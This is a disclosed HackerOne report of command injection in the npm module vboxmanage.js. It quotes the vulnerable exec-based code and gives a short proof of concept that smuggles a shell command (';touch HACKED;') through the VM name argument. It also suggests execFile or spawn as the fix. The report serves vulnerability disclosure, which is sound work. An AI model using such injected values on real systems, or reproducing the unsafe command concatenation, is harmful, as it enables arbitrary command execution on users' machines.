---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '864777'
original_report_id: '864777'
title: '[vboxmanage.js] Command Injection via insecure command concatenation'
weakness: Command Injection - Generic
team_handle: nodejs-ecosystem
created_at: '2020-05-02T14:21:33.264Z'
disclosed_at: '2020-08-20T09:08:23.411Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 0
asset_identifier: Other module
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- command-injection-generic
---

# [vboxmanage.js] Command Injection via insecure command concatenation

## Metadata

- HackerOne Report ID: 864777
- Weakness: Command Injection - Generic
- Program: nodejs-ecosystem
- Disclosed At: 2020-08-20T09:08:23.411Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a `Command Injection` issue in the `vboxmanage.js` module.
It allows to execute arbitrary commands on the victim's PC.

# Module

**module name:** `vboxmanage.js`
**version:** `1.0.6`
**npm page:** `https://www.npmjs.com/package/vboxmanage.js`

## Module Description

A wrapper for VirtualBox CLI with Promises,

## Module Stats

[2] weekly downloads

# Vulnerability

## Vulnerability Description

The issue occurs because a user input parameter is used inside a command that is executed without any check. 

I tested the `start` function.
Here's the code which causes the issue:

```javascript
// https://github.com/danielgindi/node-vboxmanage/blob/master/index.js#L76
...
var
    child_process = require('child_process'),
...
VBoxManage.manage = function (command, options) {

    command = command || [];
    if (!(command instanceof Array)) {
        command = [command];
    }

    options = options || {};

    for (var i = 0; i < command.length; i++) {
        command[i] = escapeArg(command[i]);
    }

    Object.keys(options).forEach(function (option) {

        command.push('--' + option);
        var value = options[option];

        if (value !== true) {
            command.push(escapeArg(value));
        }

    });

    if (VBoxManage.debug) {
        console.warn("$ VBoxManage " + command.join(" "));
    }

    return new Promise(function (resolve, reject) {

        child_process.exec(vBoxManageBinary + ' ' + command.join(' '), {}, function (err, stdout, stderr) {  // <-- injection

            if (err) {
                err.stderr = stderr;
                return reject(err);
            }

            return resolve({ stdout: stdout, stderr: stderr });

        });

    });
};
...
VBoxManage.start = function (vmname, gui, options) {
    options = options || {};
    options['type'] = gui ? 'gui' : 'headless';
    return this.manage(['-nologo', 'startvm', vmname], options); // <-- user input
};
...
```
The `vmname` parameter is used to build the command that is passed to the `child_process.exec` function without any check.


## Steps To Reproduce:
- create a directory for testing
    - `mkdir poc`
    - `cd poc/`

- install `vboxmanage.js` module:
    -  `npm i vboxmanage.js`
- create the following PoC JavaScript file (`poc.js`):

```javascript
var VBox = require('vboxmanage.js');
VBox.start(';touch HACKED;').then(function () {}).catch(function (err) {});
```
- make sure that the `HACKED` file does not exist:
    - `ls`
- execute the `poc.js` file:
    - `node poc.js`
- the `HACKED` file is created:
    - `ls`
    
{F812305}


## Patch
Do not concatenate/format commands using insecure user's input. Always check and sanitize it. 
In my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.exec`.

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.4

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

Command Injection on `vboxmanage.js` module via insecure command concatenation.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
